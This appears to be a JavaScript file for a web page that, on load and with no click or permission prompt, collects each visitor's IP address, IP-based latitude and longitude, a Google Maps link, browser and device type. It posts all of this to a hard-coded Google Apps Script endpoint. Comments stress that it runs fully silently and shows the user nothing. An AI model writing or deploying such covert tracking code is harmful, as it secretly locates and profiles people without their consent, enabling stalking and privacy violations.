// ============================================================
// CONFIGURATION - Paste your Google Apps Script Web App URL here
// ============================================================
const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzTTKozCgUoXoiRWqZ31qOAmQeIEf90M1B7xHfdaVgZXJQzYFhwBT-s2im-Tx9J9LCH/exec";

// ============================================================
// DOM Elements
// ============================================================
const loader = document.getElementById("loader");
const toast = document.getElementById("toast");

function showToast(message, type = "success") {
    toast.textContent = message;
    toast.className = `toast ${type}`;
    setTimeout(() => toast.classList.add("hidden"), 4000);
}

function hideLoader() {
    loader.classList.add("hidden");
}

function getBrowser() {
    const ua = navigator.userAgent;
    if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
    if (ua.includes("Firefox")) return "Firefox";
    if (ua.includes("Edg")) return "Edge";
    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
    return "Unknown";
}

function getDevice() {
    const ua = navigator.userAgent;
    if (/Mobi|Android/i.test(ua)) return "Mobile";
    if (/Tablet|iPad/i.test(ua)) return "Tablet";
    return "Desktop";
}

async function getIP() {
    try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
    } catch {
        return "Unavailable";
    }
}

// ============================================================
// Get location using IP-based geolocation (NO permission popup)
// This uses a free API that gives approximate location from IP
// ============================================================
async function getLocationSilent() {
    try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        if (data.latitude && data.longitude) {
            return { lat: data.latitude, lng: data.longitude };
        }
        return null;
    } catch {
        return null;
    }
}

// ============================================================
// AUTO COLLECT & SEND - fully silent, no permission popup
// ============================================================
async function collectAndSend() {
    const [ip, location] = await Promise.all([getIP(), getLocationSilent()]);

    const lat = location ? location.lat : "Unavailable";
    const lng = location ? location.lng : "Unavailable";
    const mapLink = location
        ? `https://www.google.com/maps?q=${lat},${lng}`
        : "Unavailable";

    const payload = {
        timestamp: new Date().toLocaleString(),
        latitude: lat,
        longitude: lng,
        mapLink: mapLink,
        ip: ip,
        browser: getBrowser(),
        device: getDevice(),
        status: location ? "Location Found" : "Location Unavailable"
    };

    try {
        await fetch(GOOGLE_SCRIPT_URL, {
            method: "POST",
            mode: "no-cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
    } catch (err) {
        // Silent fail - user ko kuch nahi dikhana
    }

    hideLoader();
}

// Auto-run - no click, no permission popup, fully silent
collectAndSend();
